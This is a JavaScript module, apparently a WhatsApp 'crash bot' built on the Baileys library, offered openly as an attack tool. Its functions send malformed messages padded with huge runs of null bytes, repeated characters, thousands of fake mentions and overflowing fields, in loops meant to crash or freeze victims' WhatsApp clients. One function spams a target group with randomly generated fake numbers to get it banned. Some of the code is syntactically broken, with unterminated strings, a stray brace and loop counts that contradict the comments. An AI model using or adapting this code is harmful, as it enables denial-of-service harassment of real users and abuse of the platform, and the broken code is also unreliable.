import fs from "fs";
import path from "path";
import pino from "pino";
import { Boom } from "@hapi/boom";
import chalk from "chalk";
import {
  generateWAMessageFromContent,
  encodeWAMessage,
  jidDecode,
  encodeSignedDeviceIdentity,
} from "@whiskeysockets/baileys";
import { log } from "./logger.js";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ----------------------------- ( HELPER: GET RANDOM DELAY ) ----------------------------- \\
/* Mengembalikan delay random antara min dan max (dalam milidetik) */
const getRandomDelay = (min, max) => {
  return Math.floor(Math.random() * (max - min + 1)) + min;
};

const travas = {
  // ----------------------------- ( DELAY X2 ) ----------------------------- \\
  /* Mengirim spam ke status dengan massive mention. Loop 700x dengan delay 3-7 detik. */
  async DelayX2(sock, X, ptcp = true) {
    for (let z = 0; z < 75; z++) {
      try {
        const msg = generateWAMessageFromContent(
          X,
          {
            interactiveResponseMessage: {
              contextInfo: {
                mentionedJid: Array.from(
                  { length: 2000 },
                  (_, y) => `6285983729${y + 1}@s.whatsapp.net`,
                ),
              },
              body: {
                text: "𖣂᳟༑ᜌ ̬     ͠⤻𝐌𝐀𝐒𝐓𝐄𝐑 ( 𖣂 ) 𝐒͓͛𝐔͢𝐏𝐄ʺ͜𝐑𝐈ͦ𝐎͓𝐑  ⃜    ᭨᳟᪳",
                format: "DEFAULT",
              },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
                version: 3,
              },
            },
          },
          {},
        );

        await sock.relayMessage("status@broadcast", msg.message, {
          messageId: msg.key.id,
          statusJidList: [X],
          additionalNodes: [
            {
              tag: "meta",
              attrs: {},
              content: [
                {
                  tag: "mentioned_users",
                  attrs: {},
                  content: [
                    {
                      tag: "to",
                      attrs: { jid: X },
                      content: undefined,
                    },
                  ],
                },
              ],
            },
          ],
        });

        log.success(`✅ InVisDelayLoc [${z + 1}/75] berhasil dikirim ke ${X}`);
      } catch (err) {
        log.error(`❌ InVisDelayLoc [${z + 1}/75] gagal: ${err.message}`);
      }

      await sleep(500);
    }

    log.info(`📊 InVisDelayLoc selesai! Total: 75 pesan → ${X}`);
  },
  // ----------------------------- ( IOS ) ----------------------------- \\
  /* Mengirim pesan extendedTextMessage. Loop 200x dengan delay 0.5-2 detik. */
  async ios(sock, X, ptcp = true) {
    log.loading(`🔥 Memulai IOS spam ke ${X}`);

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < 100; i++) {
      try {
        const extendedTextMessage = {
          text:
            "𝐒͢𝐢͡༑𝐗 ⍣᳟ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 🐉 \n\n 🫀 creditos : t.me/whiletry" +
            "𑇂𑆵𑆴𑆿".repeat(15000),
          matchedText: "https://t.me/RennXiter",
          description: "RennXiter" + "𑇂𑆵𑆴𑆿".repeat(15000),
          title: "𝐒͢𝐢͡༑𝐗 ᭯ 𝐕̸𝐨͢𝐢͡𝐝͜𝐄͝𝐭͢𝐂 ☇ 𝐆͡𝐞͜𝐓𝐒̬༑͡𝐮͢𝐗፝𝐨〽️" + "𑇂𑆵𑆴𑆿".repeat(15000),
          previewType: "NONE",
          jpegThumbnail: null,
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890",
          },
        };

        const msg = generateWAMessageFromContent(
          X,
          { viewOnceMessage: { message: { extendedTextMessage } } },
          {},
        );

        await sock.relayMessage(
          X,
          {
            groupStatusMessageV2: {
              message: msg.message,
            },
          },
          ptcp
            ? { messageId: msg.key.id, participant: { jid: X } }
            : { messageId: msg.key.id },
        );

        successCount++;
        log.success(`✅ IOS [${i + 1}/200] berhasil dikirim ke ${X}`);
      } catch (err) {
        failCount++;
        log.error(`❌ IOS [${i + 1}/200] gagal: ${err.message}`);
      }

      await sleep(getRandomDelay(500, 2000));
    }

    log.info(
      `📊 IOS selesai! ✅ ${successCount} berhasil | ❌ ${failCount} gagal → ${X}`,
    );
  },

  // ----------------------------- ( UI ) ----------------------------- \\
  /* Mengirim interactiveMessage dengan 1000 button. Loop 50x dengan delay 3-7 detik. */
  async crash(sock, target) {
    log.loading(`💥 Memulai CRASH ke ${target}`);

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < 500; i++) {
      try {
        const msg = {
          groupStatusMessageV2: {
            message: {
              interactiveMessage: {
                body: { text: "hh" + "\n" },
                nativeFlowMessage: {
                  messageParamsJson: "[".repeat(10000),
                  buttons: "\u0000".repeat(250000) + "\x10".repeat(250000),
                },
              },
            },
          },
        };

        await sock.relayMessage(target, msg, {
          participant: { jid: target },
        });

        successCount++;
        log.success(`✅ CRASH [${i + 1}/500] berhasil dikirim ke ${target}`);
      } catch (err) {
        failCount++;
        log.error(`❌ CRASH [${i + 1}/500] gagal: ${err.message}`);
      }

      await sleep(getRandomDelay(1000, 3000));
    }

    log.info(
      `📊 CRASH Complete! ✅ ${successCount} Successfull | ❌ ${failCount} gagal → ${target}`,
    );
  },
  // ----------------------------- ( CRASH ) ----------------------------- \\
  /* Mengirim pesan freeze dengan contextInfo & externalAdReply. Loop 500x dengan delay 1-3 detik. */

  // ----------------------------- ( FREEZE ) ----------------------------- \\
  /* Mengirim freeze dengan imageMessage. Loop 500x dengan delay 2-5 detik. */
  async freeze(sock, target) {
    log.loading(`❄️ Memulai FREEZE ke ${target}`);

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < 500; i++) {
      try {
        const msg = {
          groupStatusMessageV2: {
            message: {
              interactiveMessage: {
                header: {
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
                    fileLength: "93217",
                    caption: "𝖠𝗄𝗂𝗋𝖺𝖺 - 𝖷𝗉𝗈𝗌𝖾𝖽𝖽🍃",
                    height: 1080,
                    width: 1080,
                    mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
                    fileEncSha256:
                      "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
                    directPath:
                      "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1778142659",
                    jpegThumbnail:
                      "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIhIjEyQWH/2gAIAQMBAT8AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
                    contextInfo: {
                      pairedMediaType: "NOT_PAIRED_MEDIA",
                      isQuestion: true,
                      isGroupStatus: true,
                    },
                    scansSidecar:
                      "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                    scanLengths: [
                      9999999999999999999, 9999999999999999999,
                      9999999999999999999, 9999999999999999999,
                    ],
                    midQualityFileSha256:
                      "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U=",
                  },
                  title: "𝖠𝗄𝗂𝗋𝖺𝖺 - 𝖷𝗉𝗈𝗌𝖾𝖽𝖽🍃",
                  hasMediaAttachment: true,
                },
                body: {
                  text: "\0",
                },
                nativeFlowMessage: {
                  buttons: "?".repeat(500000),
                },
              },
            },
          },
        };

        await sock.relayMessage(target, msg, {
          participant: { jid: target },
        });

        successCount++;
        log.success(`✅ FREEZE [${i + 1}/500] successfully sent to ${target}`);
      } catch (err) {
        failCount++;
        log.error(`❌ FREEZE [${i + 1}/500] Failedl: ${err.message}`);
      }

      await sleep(getRandomDelay(2000, 5000));
    }

    log.info(
      `📊 FREEZE Completei! ✅ ${successCount} successful | ❌ ${failCount} gagal → ${target}`,
    );
  },

  // ----------------------------- ( GROUP BAN ) ----------------------------- \\
  /* Spam "add" ke grup (non-admin mode). Loop 20x dengan delay 4-6 detik. */
  async groupBan1(sock, target) {
    if (!target.endsWith("@g.us")) {
      log.error(`❌ Target ${target} not a group ID (@g.us)); throw new Error("❌ Target must be a group ID (@g.us)");
    }

    log.loading(`🚫 Memulai GROUP BAN (non-admin mode) ke ${target}`);

    const fakeNumbers = [];

    const indonesiaPrefix = [
      "62812",
      "62813",
      "62814",
      "62815",
      "62816",
      "62817",
      "62818",
      "62819",
      "62821",
      "62822",
      "62823",
      "62824",
      "62825",
      "62826",
      "62827",
      "62828",
      "62829",
      "62831",
      "62832",
      "62833",
      "62834",
      "62835",
      "62836",
      "62837",
      "62838",
      "62839",
      "62851",
      "62852",
      "62853",
      "62854",
      "62855",
      "62856",
      "62857",
      "62858",
      "62859",
      "62861",
      "62862",
      "62863",
      "62864",
      "62865",
      "62866",
      "62867",
      "62868",
      "62869",
      "62871",
      "62872",
      "62873",
      "62874",
      "62875",
      "62876",
      "62877",
      "62878",
      "62879",
      "62881",
      "62882",
      "62883",
      "62884",
      "62885",
      "62886",
      "62887",
      "62888",
      "62889",
      "62891",
      "62892",
      "62893",
      "62894",
      "62895",
      "62896",
      "62897",
      "62898",
      "62899",
    ];

    const internationalPrefix = [
      "1415",
      "447",
      "614",
      "4915",
      "5511",
      "349",
      "331",
      "441",
      "611",
      "812",
      "813",
      "919",
      "918",
      "971",
      "966",
      "965",
      "961",
      "962",
      "963",
      "964",
      "967",
      "968",
      "969",
    ];

    // Generate 60 nomor Indonesia
    for (let i = 0; i < 60; i++) {
      const prefix =
        indonesiaPrefix[Math.floor(Math.random() * indonesiaPrefix.length)];
      let suffix = "";
      for (let j = 0; j < 7; j++) {
        suffix +=
          j === 0
            ? Math.floor(Math.random() * 9) + 1
            : Math.floor(Math.random() * 10);
      }
      fakeNumbers.push(`${prefix}${suffix}@s.whatsapp.net`);
    }

    // Generate 20 nomor International
    for (let i = 0; i < 20; i++) {
      const prefix =
        internationalPrefix[
          Math.floor(Math.random() * internationalPrefix.length)
        ];
      let suffix = "";
      const length = Math.floor(Math.random() * 4) + 7;
      for (let j = 0; j < length; j++) {
        suffix +=
          j === 0
            ? Math.floor(Math.random() * 9) + 1
            : Math.floor(Math.random() * 10);
      }
      fakeNumbers.push(`${prefix}${suffix}@s.whatsapp.net`);
    }

    const specificNumbers = [
      "6281234567890@s.whatsapp.net",
      "6281312345678@s.whatsapp.net",
      "6281412345678@s.whatsapp.net",
      "6281512345678@s.whatsapp.net",
      "6281612345678@s.whatsapp.net",
      "6281712345678@s.whatsapp.net",
      "6281812345678@s.whatsapp.net",
      "6281912345678@s.whatsapp.net",
      "14155552671@s.whatsapp.net",
      "447400000000@s.whatsapp.net",
      "61400000000@s.whatsapp.net",
      "491512345678@s.whatsapp.net",
      "5511987654321@s.whatsapp.net",
      "349123456789@s.whatsapp.net",
    ];

    const allFakeNumbers = [...fakeNumbers, ...specificNumbers];

    // Shuffle
    for (let i = allFakeNumbers.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [allFakeNumbers[i], allFakeNumbers[j]] = [
        allFakeNumbers[j],
        allFakeNumbers[i],
      ];
    }

    log.info(`📋 Total fake numbers: ${allFakeNumbers.length}`);

    let successCount = 0;
    let failCount = 0;
    let rateLimitCount = 0;

    const maxLoops = Math.min(allFakeNumbers.length, 20);

    for (let i = 0; i < maxLoops; i++) {
      const batchSize = 1;
      const batch = [];
      const usedIndices = new Set();

      for (let j = 0; j < batchSize; j++) {
        let randomIndex;
        do {
          randomIndex = Math.floor(Math.random() * allFakeNumbers.length);
        } while (usedIndices.has(randomIndex));
        usedIndices.add(randomIndex);
        batch.push(allFakeNumbers[randomIndex]);
      }

      const promises = batch.map(async (targetNumber) => {
        const action = "add";

        try {
          await sock.groupParticipantsUpdate(target, [targetNumber], action);
          successCount++;
          log.success(`✅ [${i + 1}/${maxLoops}] ${action} → ${targetNumber}`);
          return true;
        } catch (e) {
          failCount++;
          if (
            e.message.includes("rate-overlimit") ||
            e.message.includes("too many")
          ) {
            rateLimitCount++;
          }
          log.warning(
            `⚠️ [${i + 1}/${maxLoops}] ${action} → ${targetNumber} gagal: ${e.message}`,
          );
          return false;
        }
      });

      await Promise.all(promises);
      await sleep(getRandomDelay(4000, 6000));

      if (rateLimitCount > 3) {
        log.warning(
          `⚠️ Too many rate limits (${rateLimitCount}), stopping execution...;
        );
        break;
      }
    }

    log.info(
  `📊 GROUP BAN completed! ✅ ${successCount} successful | ❌ ${failCount} failed | 🚫 Rate limit: ${rateLimitCount}`,
);
    log.info(`🎯 Target: ${target}`);
    return true;
  },

  // ----------------------------- ( CRASH GROUP ) ----------------------------- \\
  /* Mengirim crash ke grup. Loop 50x dengan delay 2-5 detik. */
async crashGrup(sock, groupJid) {
  log.loading(`💥 Starting GROUP CRASH on
   ${groupJid}`);
}

    let successCount = 0;
    let failCount = 0;

    for (let i = 0; i < 50; i++) {
      try {
        await sock.relayMessage(
          groupJid,
          {
            interactiveMessage: {
              header: {
                title: "🍃 𝖳𝗋𝖺𝗏𝖺𝗌 𝖦𝗋𝗈𝗎𝗉 2##7",
                subtitle: "",
                hasMediaAttachment: false,
              },
              body: {
                text: "▾🚩 𝖦𝗈𝖽 𝖨𝗇 𝖸𝗈𝗎𝗋 𝖡𝖾𝗁𝗂𝗇𝖽 ⿻ ▾ ",
              },
              footer: {
                text: "𝖤𝗑𝗍𝖾𝗇𝖽𝖾𝖽 - 𝖳𝖾𝗑𝗍❗",
              },
              interactiveResponseMessage: {
                body: {
                  text: "𝖤𝗑𝗍𝖾𝗇𝖽𝖾𝖽 - 𝖳𝖾𝗑𝗍❗" + "\u0000".repeat(555555),
                  format: "DEFAULT",
                },
                nativeFlowResponseMessage: {
                  name: "address_message",
                  paramsJson: "\u0000".repeat(555555),
                  version: 3,
                },
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "catalog_message",
                    buttonParamsJson: JSON.stringify({}),
                  },
                ],
                messageParamsJson: "{}",
              },
            },
          },
          {
            additionalNodes: [
              {
                tag: "biz",
                attrs: { native_flow_name: "catalog_message" },
              },
            ],
          },
        );

        successCount++;
        log.success(
          `✅ CRASH GRUP [${i + 1}/50] successfully sent to ${groupJid}`,
        );
      } catch (err) {
        failCount++;
        log.error(`❌ CRASH GRUP [${i + 1}/50] Failed: ${err.message}`);
      }

      await sleep(getRandomDelay(2000, 5000));
    }

    log.info(
      `📊 GROUP CRASH completed! ✅ ${successCount} successful | ❌ ${failCount} failed → ${groupJid}`,
  },
};

export default travas;
